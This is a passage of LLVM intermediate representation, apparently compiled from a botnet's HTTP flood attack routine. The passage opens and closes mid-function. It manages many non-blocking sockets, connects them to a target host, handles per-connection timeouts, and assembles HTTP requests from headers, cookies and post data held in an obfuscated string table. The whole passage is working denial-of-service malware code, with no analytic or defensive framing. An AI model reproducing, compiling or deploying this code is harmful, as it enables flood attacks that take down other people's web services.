  %438 = add nsw i32 %437, 1
  store i32 %438, i32* %9, align 4
  br label %149

; <label>:439:                                    ; preds = %149
  br label %440

; <label>:440:                                    ; preds = %2534, %1050, %1040, %439
  store i32 0, i32* %23, align 4
  %441 = call i64 @time(i64* null) #6
  %442 = trunc i64 %441 to i32
  store i32 %442, i32* %27, align 4
  br label %443

; <label>:443:                                    ; preds = %440
  %444 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %445 = getelementptr inbounds [16 x i64], [16 x i64]* %444, i64 0, i64 0
  %446 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %445) #6, !srcloc !1
  %447 = extractvalue { i64, i64* } %446, 0
  %448 = extractvalue { i64, i64* } %446, 1
  %449 = trunc i64 %447 to i32
  store i32 %449, i32* %28, align 4
  %450 = ptrtoint i64* %448 to i64
  %451 = trunc i64 %450 to i32
  store i32 %451, i32* %29, align 4
  br label %452

; <label>:452:                                    ; preds = %443
  br label %453

; <label>:453:                                    ; preds = %452
  %454 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %455 = getelementptr inbounds [16 x i64], [16 x i64]* %454, i64 0, i64 0
  %456 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %455) #6, !srcloc !2
  %457 = extractvalue { i64, i64* } %456, 0
  %458 = extractvalue { i64, i64* } %456, 1
  %459 = trunc i64 %457 to i32
  store i32 %459, i32* %30, align 4
  %460 = ptrtoint i64* %458 to i64
  %461 = trunc i64 %460 to i32
  store i32 %461, i32* %31, align 4
  br label %462

; <label>:462:                                    ; preds = %453
  store i32 0, i32* %9, align 4
  br label %463

; <label>:463:                                    ; preds = %1034, %462
  %464 = load i32, i32* %9, align 4
  %465 = load i32, i32* %18, align 4
  %466 = icmp slt i32 %464, %465
  br i1 %466, label %467, label %1037

; <label>:467:                                    ; preds = %463
  %468 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %469 = load i32, i32* %9, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %468, i64 %470
  store %struct.attack_http_state* %471, %struct.attack_http_state** %26, align 8
  %472 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %473 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %472, i32 0, i32 1
  %474 = load i8, i8* %473, align 4
  %475 = zext i8 %474 to i32
  %476 = icmp eq i32 %475, 1
  br i1 %476, label %477, label %489

; <label>:477:                                    ; preds = %467
  %478 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %479 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %478, i32 0, i32 12
  %480 = load i32, i32* %479, align 4
  %481 = icmp ne i32 %480, 0
  br i1 %481, label %482, label %485

; <label>:482:                                    ; preds = %477
  %483 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %484 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %483, i32 0, i32 1
  store i8 4, i8* %484, align 4
  br label %488

; <label>:485:                                    ; preds = %477
  %486 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %487 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %486, i32 0, i32 1
  store i8 0, i8* %487, align 4
  br label %488

; <label>:488:                                    ; preds = %485, %482
  br label %489

; <label>:489:                                    ; preds = %488, %467
  %490 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %491 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %490, i32 0, i32 1
  %492 = load i8, i8* %491, align 4
  %493 = zext i8 %492 to i32
  %494 = icmp eq i32 %493, 0
  br i1 %494, label %495, label %575

; <label>:495:                                    ; preds = %489
  %496 = bitcast %struct.sockaddr_in* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* %496, i8 0, i64 16, i32 4, i1 false)
  %497 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %498 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %497, i32 0, i32 0
  %499 = load i32, i32* %498, align 4
  %500 = icmp ne i32 %499, -1
  br i1 %500, label %501, label %506

; <label>:501:                                    ; preds = %495
  %502 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %503 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %502, i32 0, i32 0
  %504 = load i32, i32* %503, align 4
  %505 = call i32 @close(i32 %504)
  br label %506

; <label>:506:                                    ; preds = %501, %495
  %507 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %508 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %509 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %508, i32 0, i32 0
  store i32 %507, i32* %509, align 4
  %510 = icmp eq i32 %507, -1
  br i1 %510, label %511, label %512

; <label>:511:                                    ; preds = %506
  br label %1034

; <label>:512:                                    ; preds = %506
  %513 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %514 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %513, i32 0, i32 0
  %515 = load i32, i32* %514, align 4
  %516 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %517 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %516, i32 0, i32 0
  %518 = load i32, i32* %517, align 4
  %519 = call i32 (i32, i32, ...) @fcntl(i32 %518, i32 3, i32 0)
  %520 = or i32 2048, %519
  %521 = call i32 (i32, i32, ...) @fcntl(i32 %515, i32 4, i32 %520)
  store i32 65535, i32* %10, align 4
  %522 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %523 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %522, i32 0, i32 0
  %524 = load i32, i32* %523, align 4
  %525 = bitcast i32* %10 to i8*
  %526 = call i32 @setsockopt(i32 %524, i32 0, i32 8, i8* %525, i32 4) #6
  %527 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %527, align 4
  %528 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %529 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %528, i32 0, i32 4
  %530 = load i32, i32* %529, align 4
  %531 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %532 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %531, i32 0, i32 0
  store i32 %530, i32* %532, align 4
  %533 = load i16, i16* %19, align 2
  %534 = call zeroext i16 @htons(i16 zeroext %533) #7
  %535 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
  store i16 %534, i16* %535, align 2
  %536 = load i32, i32* %27, align 4
  %537 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %538 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %537, i32 0, i32 2
  store i32 %536, i32* %538, align 4
  %539 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %540 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %539, i32 0, i32 1
  store i8 2, i8* %540, align 4
  %541 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %542 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %541, i32 0, i32 0
  %543 = load i32, i32* %542, align 4
  %544 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %545 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %545, %struct.sockaddr** %544, align 8
  %546 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %547 = load %struct.sockaddr*, %struct.sockaddr** %546, align 8
  %548 = call i32 @connect(i32 %543, %struct.sockaddr* %547, i32 16)
  %549 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %550 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %549, i32 0, i32 0
  %551 = load i32, i32* %550, align 4
  %552 = srem i32 %551, 64
  %553 = zext i32 %552 to i64
  %554 = shl i64 1, %553
  %555 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %556 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %557 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %556, i32 0, i32 0
  %558 = load i32, i32* %557, align 4
  %559 = sdiv i32 %558, 64
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds [16 x i64], [16 x i64]* %555, i64 0, i64 %560
  %562 = load i64, i64* %561, align 8
  %563 = or i64 %562, %554
  store i64 %563, i64* %561, align 8
  %564 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %565 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %564, i32 0, i32 0
  %566 = load i32, i32* %565, align 4
  %567 = load i32, i32* %23, align 4
  %568 = icmp sgt i32 %566, %567
  br i1 %568, label %569, label %574

; <label>:569:                                    ; preds = %512
  %570 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %571 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %570, i32 0, i32 0
  %572 = load i32, i32* %571, align 4
  %573 = add nsw i32 %572, 1
  store i32 %573, i32* %23, align 4
  br label %574

; <label>:574:                                    ; preds = %569, %512
  br label %1033

; <label>:575:                                    ; preds = %489
  %576 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %577 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %576, i32 0, i32 1
  %578 = load i8, i8* %577, align 4
  %579 = zext i8 %578 to i32
  %580 = icmp eq i32 %579, 2
  br i1 %580, label %581, label %624

; <label>:581:                                    ; preds = %575
  %582 = load i32, i32* %27, align 4
  %583 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %584 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %583, i32 0, i32 2
  %585 = load i32, i32* %584, align 4
  %586 = sub i32 %582, %585
  %587 = icmp ugt i32 %586, 30
  br i1 %587, label %588, label %597

; <label>:588:                                    ; preds = %581
  %589 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %590 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %589, i32 0, i32 1
  store i8 0, i8* %590, align 4
  %591 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %592 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %591, i32 0, i32 0
  %593 = load i32, i32* %592, align 4
  %594 = call i32 @close(i32 %593)
  %595 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %596 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %595, i32 0, i32 0
  store i32 -1, i32* %596, align 4
  br label %1034

; <label>:597:                                    ; preds = %581
  %598 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %599 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %598, i32 0, i32 0
  %600 = load i32, i32* %599, align 4
  %601 = srem i32 %600, 64
  %602 = zext i32 %601 to i64
  %603 = shl i64 1, %602
  %604 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %605 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %606 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %605, i32 0, i32 0
  %607 = load i32, i32* %606, align 4
  %608 = sdiv i32 %607, 64
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds [16 x i64], [16 x i64]* %604, i64 0, i64 %609
  %611 = load i64, i64* %610, align 8
  %612 = or i64 %611, %603
  store i64 %612, i64* %610, align 8
  %613 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %614 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %613, i32 0, i32 0
  %615 = load i32, i32* %614, align 4
  %616 = load i32, i32* %23, align 4
  %617 = icmp sgt i32 %615, %616
  br i1 %617, label %618, label %623

; <label>:618:                                    ; preds = %597
  %619 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %620 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %619, i32 0, i32 0
  %621 = load i32, i32* %620, align 4
  %622 = add nsw i32 %621, 1
  store i32 %622, i32* %23, align 4
  br label %623

; <label>:623:                                    ; preds = %618, %597
  br label %1032

; <label>:624:                                    ; preds = %575
  %625 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %626 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %625, i32 0, i32 1
  %627 = load i8, i8* %626, align 4
  %628 = zext i8 %627 to i32
  %629 = icmp eq i32 %628, 4
  br i1 %629, label %630, label %904

; <label>:630:                                    ; preds = %624
  %631 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %632 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %631, i32 0, i32 14
  store i32 -1, i32* %632, align 4
  %633 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %634 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %633, i32 0, i32 11
  store i32 0, i32* %634, align 4
  %635 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %636 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %635, i32 0, i32 18
  %637 = getelementptr inbounds [1024 x i8], [1024 x i8]* %636, i32 0, i32 0
  call void @util_zero(i8* %637, i32 1024)
  %638 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %639 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %638, i32 0, i32 17
  store i32 0, i32* %639, align 4
  %640 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  call void @util_zero(i8* %640, i32 10240)
  %641 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %642 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %643 = call i32 @util_strlen(i8* %642)
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds i8, i8* %641, i64 %644
  %646 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %647 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %646, i32 0, i32 9
  %648 = getelementptr inbounds [9 x i8], [9 x i8]* %647, i32 0, i32 0
  %649 = call i32 @util_strcpy(i8* %645, i8* %648)
  %650 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %651 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %652 = call i32 @util_strlen(i8* %651)
  %653 = sext i32 %652 to i64
  %654 = getelementptr inbounds i8, i8* %650, i64 %653
  %655 = call i32 @util_strcpy(i8* %654, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %656 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %657 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %658 = call i32 @util_strlen(i8* %657)
  %659 = sext i32 %658 to i64
  %660 = getelementptr inbounds i8, i8* %656, i64 %659
  %661 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %662 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %661, i32 0, i32 6
  %663 = getelementptr inbounds [257 x i8], [257 x i8]* %662, i32 0, i32 0
  %664 = call i32 @util_strcpy(i8* %660, i8* %663)
  %665 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %666 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %667 = call i32 @util_strlen(i8* %666)
  %668 = sext i32 %667 to i64
  %669 = getelementptr inbounds i8, i8* %665, i64 %668
  %670 = call i32 @util_strcpy(i8* %669, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %671 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %672 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %673 = call i32 @util_strlen(i8* %672)
  %674 = sext i32 %673 to i64
  %675 = getelementptr inbounds i8, i8* %671, i64 %674
  %676 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %677 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %676, i32 0, i32 5
  %678 = getelementptr inbounds [512 x i8], [512 x i8]* %677, i32 0, i32 0
  %679 = call i32 @util_strcpy(i8* %675, i8* %678)
  %680 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %681 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %682 = call i32 @util_strlen(i8* %681)
  %683 = sext i32 %682 to i64
  %684 = getelementptr inbounds i8, i8* %680, i64 %683
  %685 = call i32 @util_strcpy(i8* %684, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %686 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %687 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %688 = call i32 @util_strlen(i8* %687)
  %689 = sext i32 %688 to i64
  %690 = getelementptr inbounds i8, i8* %686, i64 %689
  %691 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %692 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %691, i32 0, i32 7
  %693 = getelementptr inbounds [129 x i8], [129 x i8]* %692, i32 0, i32 0
  %694 = call i32 @util_strcpy(i8* %690, i8* %693)
  %695 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %696 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %697 = call i32 @util_strlen(i8* %696)
  %698 = sext i32 %697 to i64
  %699 = getelementptr inbounds i8, i8* %695, i64 %698
  %700 = call i32 @util_strcpy(i8* %699, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 32)
  %701 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %702 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %703 = call i32 @util_strlen(i8* %702)
  %704 = sext i32 %703 to i64
  %705 = getelementptr inbounds i8, i8* %701, i64 %704
  %706 = call i8* @table_retrieve_val(i32 32, i32* null)
  %707 = call i32 @util_strcpy(i8* %705, i8* %706)
  call void @table_lock_val(i8 zeroext 32)
  %708 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %709 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %710 = call i32 @util_strlen(i8* %709)
  %711 = sext i32 %710 to i64
  %712 = getelementptr inbounds i8, i8* %708, i64 %711
  %713 = call i32 @util_strcpy(i8* %712, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 33)
  %714 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %715 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %716 = call i32 @util_strlen(i8* %715)
  %717 = sext i32 %716 to i64
  %718 = getelementptr inbounds i8, i8* %714, i64 %717
  %719 = call i8* @table_retrieve_val(i32 33, i32* null)
  %720 = call i32 @util_strcpy(i8* %718, i8* %719)
  call void @table_lock_val(i8 zeroext 33)
  %721 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %722 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %723 = call i32 @util_strlen(i8* %722)
  %724 = sext i32 %723 to i64
  %725 = getelementptr inbounds i8, i8* %721, i64 %724
  %726 = call i32 @util_strcpy(i8* %725, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 34)
  %727 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %728 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %729 = call i32 @util_strlen(i8* %728)
  %730 = sext i32 %729 to i64
  %731 = getelementptr inbounds i8, i8* %727, i64 %730
  %732 = call i8* @table_retrieve_val(i32 34, i32* null)
  %733 = call i32 @util_strcpy(i8* %731, i8* %732)
  call void @table_lock_val(i8 zeroext 34)
  %734 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %735 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %736 = call i32 @util_strlen(i8* %735)
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds i8, i8* %734, i64 %737
  %739 = call i32 @util_strcpy(i8* %738, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %740 = load i8*, i8** %14, align 8
  %741 = icmp ne i8* %740, null
  br i1 %741, label %742, label %783

; <label>:742:                                    ; preds = %630
  call void @table_unlock_val(i8 zeroext 35)
  %743 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %744 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %745 = call i32 @util_strlen(i8* %744)
  %746 = sext i32 %745 to i64
  %747 = getelementptr inbounds i8, i8* %743, i64 %746
  %748 = call i8* @table_retrieve_val(i32 35, i32* null)
  %749 = call i32 @util_strcpy(i8* %747, i8* %748)
  call void @table_lock_val(i8 zeroext 35)
  %750 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %751 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %752 = call i32 @util_strlen(i8* %751)
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds i8, i8* %750, i64 %753
  %755 = call i32 @util_strcpy(i8* %754, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %756 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %757 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %758 = call i32 @util_strlen(i8* %757)
  %759 = sext i32 %758 to i64
  %760 = getelementptr inbounds i8, i8* %756, i64 %759
  %761 = call i8* @table_retrieve_val(i32 40, i32* null)
  %762 = call i32 @util_strcpy(i8* %760, i8* %761)
  %763 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %764 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %765 = call i32 @util_strlen(i8* %764)
  %766 = sext i32 %765 to i64
  %767 = getelementptr inbounds i8, i8* %763, i64 %766
  %768 = call i32 @util_strcpy(i8* %767, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %769 = load i8*, i8** %14, align 8
  %770 = call i32 @util_strlen(i8* %769)
  %771 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %772 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %773 = call i32 @util_strlen(i8* %772)
  %774 = sext i32 %773 to i64
  %775 = getelementptr inbounds i8, i8* %771, i64 %774
  %776 = call i8* @util_itoa(i32 %770, i32 10, i8* %775)
  %777 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %778 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %779 = call i32 @util_strlen(i8* %778)
  %780 = sext i32 %779 to i64
  %781 = getelementptr inbounds i8, i8* %777, i64 %780
  %782 = call i32 @util_strcpy(i8* %781, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %783

; <label>:783:                                    ; preds = %742, %630
  %784 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %785 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %784, i32 0, i32 15
  %786 = load i32, i32* %785, align 4
  %787 = icmp sgt i32 %786, 0
  br i1 %787, label %788, label %830

; <label>:788:                                    ; preds = %783
  %789 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %790 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %791 = call i32 @util_strlen(i8* %790)
  %792 = sext i32 %791 to i64
  %793 = getelementptr inbounds i8, i8* %789, i64 %792
  %794 = call i32 @util_strcpy(i8* %793, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0))
  store i32 0, i32* %10, align 4
  br label %795

; <label>:795:                                    ; preds = %820, %788
  %796 = load i32, i32* %10, align 4
  %797 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %798 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %797, i32 0, i32 15
  %799 = load i32, i32* %798, align 4
  %800 = icmp slt i32 %796, %799
  br i1 %800, label %801, label %823

; <label>:801:                                    ; preds = %795
  %802 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %803 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %804 = call i32 @util_strlen(i8* %803)
  %805 = sext i32 %804 to i64
  %806 = getelementptr inbounds i8, i8* %802, i64 %805
  %807 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %808 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %807, i32 0, i32 16
  %809 = load i32, i32* %10, align 4
  %810 = sext i32 %809 to i64
  %811 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %808, i64 0, i64 %810
  %812 = getelementptr inbounds [128 x i8], [128 x i8]* %811, i32 0, i32 0
  %813 = call i32 @util_strcpy(i8* %806, i8* %812)
  %814 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %815 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %816 = call i32 @util_strlen(i8* %815)
  %817 = sext i32 %816 to i64
  %818 = getelementptr inbounds i8, i8* %814, i64 %817
  %819 = call i32 @util_strcpy(i8* %818, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0))
  br label %820

; <label>:820:                                    ; preds = %801
  %821 = load i32, i32* %10, align 4
  %822 = add nsw i32 %821, 1
  store i32 %822, i32* %10, align 4
  br label %795

; <label>:823:                                    ; preds = %795
  %824 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %825 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %826 = call i32 @util_strlen(i8* %825)
  %827 = sext i32 %826 to i64
  %828 = getelementptr inbounds i8, i8* %824, i64 %827
  %829 = call i32 @util_strcpy(i8* %828, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %830

; <label>:830:                                    ; preds = %823, %783
  %831 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %832 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %833 = call i32 @util_strlen(i8* %832)
  %834 = sext i32 %833 to i64
  %835 = getelementptr inbounds i8, i8* %831, i64 %834
  %836 = call i32 @util_strcpy(i8* %835, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %837 = load i8*, i8** %14, align 8
  %838 = icmp ne i8* %837, null
  br i1 %838, label %839, label %847

; <label>:839:                                    ; preds = %830
  %840 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %841 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %842 = call i32 @util_strlen(i8* %841)
  %843 = sext i32 %842 to i64
  %844 = getelementptr inbounds i8, i8* %840, i64 %843
  %845 = load i8*, i8** %14, align 8
  %846 = call i32 @util_strcpy(i8* %844, i8* %845)
  br label %847

; <label>:847:                                    ; preds = %839, %830
  %848 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %849 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %848, i32 0, i32 9
  %850 = getelementptr inbounds [9 x i8], [9 x i8]* %849, i32 0, i32 0
  %851 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %852 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %851, i32 0, i32 10
  %853 = getelementptr inbounds [9 x i8], [9 x i8]* %852, i32 0, i32 0
  %854 = call signext i8 @util_strcmp(i8* %850, i8* %853)
  %855 = icmp ne i8 %854, 0
  br i1 %855, label %864, label %856

; <label>:856:                                    ; preds = %847
  %857 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %858 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %857, i32 0, i32 9
  %859 = getelementptr inbounds [9 x i8], [9 x i8]* %858, i32 0, i32 0
  %860 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %861 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %860, i32 0, i32 10
  %862 = getelementptr inbounds [9 x i8], [9 x i8]* %861, i32 0, i32 0
  %863 = call i32 @util_strcpy(i8* %859, i8* %862)
  br label %864

; <label>:864:                                    ; preds = %856, %847
  %865 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
